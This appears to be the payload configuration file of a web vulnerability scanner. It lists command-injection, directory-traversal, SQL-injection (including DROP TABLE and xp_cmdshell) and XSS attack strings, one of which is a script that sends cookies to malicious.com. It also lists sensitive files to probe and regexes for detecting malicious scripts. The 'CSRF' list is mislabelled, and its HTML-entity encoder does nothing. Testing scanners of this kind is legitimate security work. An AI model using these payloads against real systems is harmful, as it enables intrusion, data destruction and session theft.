#for command injection scanner
CMD_PAYLOADS = [
    "; ls", "&& whoami", "| id", "$(id)", "& echo vulnerable",
    "|| cat /etc/passwd", "|| powershell whoami", "0; id"
]

# for csrf scanner
CSRF_PAYLOADS = [
    # Basic XSS payloads (common in reflected CSRF)
    "<img src='javascript:alert(\"CSRF\");'>",
    "<script>window.location='http://malicious.com/steal?c='+document.cookie</script>",
    
    # Form-based actions (POST payloads)
    "action=transfer&amount=10000&recipient=attacker@example.com",
    "delete_account=true",
    "new_email=attacker@example.com",
    
    # JSON payloads (for API endpoints)
    '{"action": "update", "balance": "0", "user": "admin"}',
    '{"command": "reset_password", "new_password": "hacked"}',
    
    # Encoded payloads to bypass basic filters
    "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",  # URL-encoded script tag
    "a%09ction=transfer%20to=malicious",         # Tab character and space evasion
    
    # Long payloads to test input sanitization
    "a" * 1000 + "<script>alert('XSS')</script>",
    
    # SQL-like patterns (to test parameter misuse)
    "' OR '1'='1; --",
    "'; DROP TABLE users; --",
    
    # File upload exploitation
    "file=<script>alert('XSS')</script>.jpg",
    
    # Session manipulation
    "session_id=malicious_session_token",
    
    # Parameter pollution (multiple values)
    "param=value1&param=value2",
    
    # Unicode evasion (e.g., UTF-8 BOM)
    "\xEF\xBB\xBF<script>alert('XSS')</script>"
]

#Directory Traversal Scannner
DIR_PAYLOADS = [
    "../../etc/passwd",        # Linux
    "../../windows/win.ini",   # Windows
    "..%2f..%2fetc%2fpasswd",  # URL Encoded Linux
    "..\\..\\windows\\win.ini" # Windows Backslashes
]

# Network Scanner
COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 81, 110, 111, 135, 139, 143, 443, 445, 
    465, 514, 587, 636, 993, 995, 1080, 1433, 1434, 1521, 1701, 
    1723, 1883, 1900, 2049, 2082, 2083, 2086, 2087, 2095, 2096, 
    2375, 2376, 3000, 3128, 3306, 3389, 4000, 4040, 4080, 4500, 
    4567, 4848, 4900, 4993, 5000, 5432, 5601, 5672, 5900, 5938, 
    5984, 6379, 6666, 6881, 6969, 7000, 7077, 7547, 7680, 7687, 
    7777, 7890, 8000, 8008, 8042, 8069, 8080, 8081, 8088, 8090, 
    8091, 8181, 8200, 8222, 8243, 8280, 8333, 8443, 8500, 8530, 
    8531, 8880, 8888, 8983, 9000, 9042, 9090, 9091, 9100, 9200, 
    9443, 9500, 9800, 9981, 10000, 10250, 10255, 10443, 11211, 
    12000, 12345, 15672, 16010, 16080, 16992, 16993, 18091, 18092, 
    27017, 27018, 28015, 32400
]

OPTIMIZED_SERVICE_MAP = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 
    80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS", 
    143: "IMAP", 443: "HTTPS", 445: "SMB", 465: "SMTPS", 587: "SMTP", 
    636: "LDAPS", 993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle", 
    1723: "PPTP", 2049: "NFS", 2375: "Docker", 2376: "Docker", 
    3000: "Node", 3306: "MySQL", 3389: "RDP", 4500: "IPsec", 5000: "UPnP", 
    5432: "PostgreSQL", 5601: "Kibana", 5672: "AMQP", 5900: "VNC", 
    5984: "CouchDB", 6379: "Redis", 7474: "Neo4j", 7687: "Bolt", 
    8000: "HTTP-Alt", 8080: "HTTP-Proxy", 8081: "HTTP-Alt", 8443: "HTTPS-Alt", 
    8500: "Consul", 8888: "Jupyter", 9000: "PHP", 9042: "Cassandra", 
    9090: "Prometheus", 9200: "Elastic", 9418: "Git", 11211: "Memcached", 
    15672: "RabbitMQ", 27017: "MongoDB"
}

# Server Misconfigurations Scanner
SENSITIVE_FILES = [
    ".env", "config.php", "wp-config.php", "database.yml", ".git/", 
    ".htaccess", "docker-compose.yml", "id_rsa", "id_rsa.pub", 
    "server.key", "server.crt", "credentials.json"
]
SECURITY_HEADERS = [
    "Strict-Transport-Security", "X-Frame-Options", "Content-Security-Policy", 
    "X-XSS-Protection", "X-Content-Type-Options", "Referrer-Policy"
]

# For SQL Injection Scanner
SQLI_PAYLOADS = [
    "' OR '1'='1--", 
    "' OR 1=1#",
    "' UNION SELECT 1,2,3--",
    "' OR SLEEP(5)--",
    "'; DROP TABLE users--",
    "' OR 1=CAST((SELECT 1 FROM users) AS NUMERIC)--",
    "'; SELECT * FROM users--",
    "'; SELECT pg_sleep(5)--",  # PostgreSQL time-based
    "'; WAITFOR DELAY '0:0:5'--",  # MSSQL time-based
    "'; SELECT SLEEP(5)--",
    "'; SELECT 1 WHERE 1=1 AND SLEEP(5)--",
    "'; SELECT 1; EXEC xp_cmdshell 'ping 127.0.0.1'--"
]
SQLI_ERROR_KEYWORDS = [
    "SQL syntax", 
    "database error", 
    "syntax error", 
    "ORA-", 
    "PostgreSQL", 
    "pg_", 
    "Microsoft SQL Server", 
    "MySQL", 
    "Unclosed quotation mark", 
    "You have an error in your SQL syntax"
]

# For URL Scanner
import re
SUSPICIOUS_PATTERNS = [
    # Existing patterns
    re.compile(r"<iframe.*?>", re.IGNORECASE),
    re.compile(r"eval\([^)]*\)", re.IGNORECASE),
    re.compile(r"document\.write\([^)]*\)", re.IGNORECASE),
    re.compile(r"unescape\([^)]*\)", re.IGNORECASE),

    # New patterns
    # Malicious scripts and event handlers
    re.compile(r"<script.*?onerror\s*=\s*['\"][^'\"]*['\"].*?>", re.IGNORECASE),
    re.compile(r"<img.*?onerror\s*=\s*['\"][^'\"]*['\"].*?>", re.IGNORECASE),
    re.compile(r"on(mouse|click|load|error)\s*=\s*['\"][^'\"]*['\"]", re.IGNORECASE),

    # Obfuscation and encoding
    re.compile(r"data:text/javascript;base64", re.IGNORECASE),
    re.compile(r"atob\([^)]*\)|btoa\([^)]*\)", re.IGNORECASE),

    # Redirection and navigation
    re.compile(r"<meta\s+http-equiv\s*=\s*['\"]refresh['\"]\s+content\s*=\s*\d+;\s*url=", re.IGNORECASE),
    re.compile(r"window\.location\s*[=+]", re.IGNORECASE),

    # Client-side execution
    re.compile(r"alert\([^)]*\)|prompt\([^)]*\)|confirm\([^)]*\)", re.IGNORECASE),
    re.compile(r"expression\([^)]*\)", re.IGNORECASE),
    re.compile(r"window\.open\([^)]*\)", re.IGNORECASE),

    # Malicious elements
    re.compile(r"<a.*?href\s*=\s*['\"]javascript:[^'\"]*['\"].*?>", re.IGNORECASE),
    re.compile(r"javascript:[^ ]*", re.IGNORECASE),
    re.compile(r"innerHTML\s*[=+]", re.IGNORECASE)
]


# For XSS Scanner
TAGS = ["script", "img", "div", "input"]
EVENTS = ["onerror", "onload", "onclick", "onmouseover", "onfocus"]
ATTRIBUTES = ["src", "href", "action"]
ENCODINGS = {
    "hex": lambda s: s.encode("utf-8").hex(),
    "entity": lambda s: s.replace("<", "<").replace(">", ">").replace("'", "&#39;"),
    "normal": lambda s: s
}
PAYLOAD_TEMPLATES = [
    "<{tag} {event}='alert(`XSS`)' {attr}='x'>",
    "<{tag} {event}='javascript:alert(`XSS`)' {attr}='x'>",
    "<{tag} {attr}='x' {event}='alert(`XSS`)'/>",
    "<{tag} {attr}='x' {event}='javascript:alert(`XSS`)'/>",
    "<{tag} {event}='alert(`XSS`)'/>",
    "<{tag} {event}='javascript:alert(`XSS`)'/>",
    "<{tag} {attr}='x' {event}='alert(`XSS`)'/>",
    "<{tag} {event}='alert(`XSS`)' {attr}='x'/>",
    "<{tag} {event}='alert(`XSS`)' style=expression(alert(`XSS`))>",
    "<{tag} srcdoc='<script>alert(`XSS`)</script>'>",
    # Use precomputed base64 string for the script content
    "<{tag} {event}='alert(`XSS`)' {attr}='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
    "<{tag} {event}='alert(`XSS`)' {attr}='javascript:alert(`XSS`)'/>",
    "<{tag} {event}='alert(`XSS`)' {attr}='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>"
]
